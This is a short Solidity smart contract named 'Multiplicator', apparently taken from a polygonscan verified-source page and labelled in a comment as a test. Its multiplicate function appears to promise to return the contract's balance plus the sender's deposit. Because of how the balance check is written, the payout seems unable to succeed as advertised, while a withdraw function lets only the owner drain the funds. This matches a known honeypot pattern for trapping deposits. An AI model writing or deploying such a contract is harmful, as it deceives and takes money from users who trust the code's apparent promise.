/**
 *Submitted for verification at polygonscan.com on 2021-07-12
*/

pragma solidity ^0.8.4;

// test to move matic from contract to invoker

contract Multiplicator
{
    address payable public Owner = payable(msg.sender);
   
    fallback() external payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }
    
    function multiplicate(address payable adr)
    payable public
    {
        if(msg.value>=address(this).balance)
        {        
            adr.transfer(address(this).balance+msg.value);
        }
    }
}